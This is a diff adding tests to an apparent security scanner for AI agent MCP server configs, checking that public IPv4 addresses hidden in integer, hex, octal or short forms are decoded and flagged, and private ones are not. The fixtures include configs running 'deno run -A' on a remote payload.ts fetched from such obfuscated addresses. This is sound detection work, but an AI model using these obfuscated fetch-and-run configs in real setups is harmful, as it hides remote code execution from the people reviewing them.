@@ -30,6 +30,9 @@ from scanners.agent_supply_chain import (  # noqa: E402
     _CONFUSABLE_WORD,
     _confidence_rank,
     _normalize_confidence,
+    _is_public_ip_literal,
+    _parse_ipv4_number,
+    _normalize_ipv4_host,
 )
 
 
@@ -991,6 +994,122 @@ def test_remote_source_lookalike_host_not_flagged(scanner, tmp_path):
     result = scanner.scan_directory(_write_mcp(tmp_path, config))
     assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
         "a host that merely contains a source-host substring must not be flagged"
+
+
+# --- AGENT-MCP-005: obfuscated public IPv4 literals (F8) ------------------------
+# ipaddress.ip_address only accepts the dotted quad, so the integer / hex / octal /
+# short-dotted forms — which the WHATWG URL parsers deno/npx/bunx use all resolve
+# to the SAME public address — used to score 0. Each must now be decoded and flagged.
+
+@pytest.mark.parametrize("host", [
+    "134744072",             # 32-bit integer form of 8.8.8.8
+    "0x08080808",            # hex form
+    "0010.0010.0010.0010",   # octal per-octet form
+    "8.526344",              # 2-part short form
+    "0x8.0x8.0x8.0x8",       # per-octet hex
+])
+def test_remote_source_obfuscated_public_ipv4_flagged(scanner, tmp_path, host):
+    config = {
+        "mcpServers": {
+            "svc": {"command": "deno", "args": ["run", "-A", f"https://{host}/payload.ts"]}
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    findings = [f for f in result.findings if f.cve_id == "AGENT-MCP-005"]
+    assert findings, f"an obfuscated public IPv4 literal ({host}) must be flagged"
+    # The finding surfaces the decoded dotted quad, not just the evasion spelling.
+    assert "8.8.8.8" in findings[0].description
+
+
+def test_remote_source_obfuscated_private_ipv4_not_flagged(scanner, tmp_path):
+    # The same obfuscation over a loopback / private address is local dev, NOT a
+    # remote-fetch smell — decoding must classify it correctly and stay silent.
+    config = {
+        "mcpServers": {
+            "a": {"command": "node", "args": ["http://0x7f000001:8000/sse"]},   # 127.0.0.1
+            "b": {"command": "node", "args": ["http://2130706433:8000/sse"]},   # 127.0.0.1
+            "c": {"command": "node", "args": ["http://3232235777:3000/mcp"]},   # 192.168.1.1
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "an obfuscated loopback / private IPv4 literal must not be flagged"
+
+
+def test_remote_source_numeric_looking_hostname_not_flagged(scanner, tmp_path):
+    # A host with any non-numeric label is a hostname, never a numeric IPv4 —
+    # the strict all-parts-numeric requirement must leave it to hostname handling.
+    config = {
+        "mcpServers": {
+            "ok": {"command": "npx", "args": ["mcp-remote", "https://api.vendor.com/mcp"]},
+            "n8": {"command": "npx", "args": ["mcp-remote", "https://8.8.8.8.example.com/x"]},
+        }
+    }
+    result = scanner.scan_directory(_write_mcp(tmp_path, config))
+    assert not any(f.cve_id == "AGENT-MCP-005" for f in result.findings), \
+        "a numeric-looking hostname must not be misread as an IPv4 literal"
+
+
+# --- WHATWG IPv4 normalization unit tests (F8) ---------------------------------
+
+@pytest.mark.parametrize("host", [
+    "134744072", "0x08080808", "0010.0010.0010.0010", "8.526344",
+    "0x8.0x8.0x8.0x8", "8.8.8.8", "8.8.8.8.",  # canonical + trailing dot
+])
+def test_normalize_ipv4_decodes_all_forms_to_8888(host):
+    ip = _normalize_ipv4_host(host)
+    assert ip is not None and str(ip) == "8.8.8.8", f"{host} should decode to 8.8.8.8"
+
+
+@pytest.mark.parametrize("host,expected", [
+    ("2130706433", "127.0.0.1"),
+    ("0x7f000001", "127.0.0.1"),
+    ("3232235777", "192.168.1.1"),
+    ("0300.0250.0.1", "192.168.0.1"),
+])
+def test_normalize_ipv4_decodes_private_forms(host, expected):
+    ip = _normalize_ipv4_host(host)
+    assert ip is not None and str(ip) == expected
+
+
+@pytest.mark.parametrize("host", [
+    "api.vendor.com", "raw.githubusercontent.com", "foo",
+    "1.2.3.4.5",       # too many parts
+    "8.8.8.999",       # last octet out of range for a 4-part form
+    "0xZZ",            # non-hex digits after 0x
+    "1_0", "+5", "-1", # Python int() leniency must be rejected
+    "", "::1",         # empty / IPv6
+])
+def test_normalize_ipv4_rejects_non_ipv4(host):
+    assert _normalize_ipv4_host(host) is None
+
+
+@pytest.mark.parametrize("part,expected", [
+    ("0", 0),        # decimal zero
+    ("255", 255),    # decimal
+    ("0x0a", 10),    # hex
+    ("0xFF", 255),   # hex, upper
+    ("010", 8),      # octal (leading zero)
+    ("00", 0),       # octal zero
+    ("0x", 0),       # empty after 0x prefix -> zero
+])
+def test_parse_ipv4_number_radix(part, expected):
+    assert _parse_ipv4_number(part) == expected
+
+
+@pytest.mark.parametrize("part", ["", "1_0", "+5", "0xZZ", "089", "abc"])
+def test_parse_ipv4_number_rejects(part):
+    # "089" is decimal-looking but "9" isn't an octal digit (leading 0 -> octal).
+    assert _parse_ipv4_number(part) is None
+
+
+def test_is_public_ip_literal_obfuscated_forms():
+    # Public obfuscated forms are public; private/loopback obfuscated forms are not.
+    assert _is_public_ip_literal("134744072") is True    # 8.8.8.8
+    assert _is_public_ip_literal("0x08080808") is True   # 8.8.8.8
+    assert _is_public_ip_literal("2130706433") is False  # 127.0.0.1
+    assert _is_public_ip_literal("0x7f000001") is False  # 127.0.0.1
+    assert _is_public_ip_literal("api.vendor.com") is False
 
 
 # --- AGENT-N8N-002: credential read paired with an external exfil sink ----------
